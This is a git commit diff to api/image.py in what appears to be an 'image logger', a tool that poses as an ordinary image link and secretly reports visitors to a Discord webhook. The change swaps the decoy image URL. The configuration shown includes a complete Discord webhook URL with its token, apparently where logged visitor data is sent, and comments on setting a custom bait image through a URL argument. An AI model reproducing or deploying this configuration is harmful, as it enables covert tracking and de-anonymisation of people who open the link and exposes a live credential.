d508b7f516d3315fef2c0cc529ebaa10fdbda1a4
System-Li <lioontop701@gmail.com>
2025-08-04 18:49:32 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1401962249022603374/EaYYFkLVSHwr4Ln5yGzlCEXxAsgxhWD3sNpNnQ3PSxNeTmqICwVX3N3RQ6NqT34IZul6",
-    "image": "https://i.ytimg.com/vi/kDonZwaEnEw/maxresdefault.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media.tenor.com/eW1CLbUxjKMAAAAm/ok.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
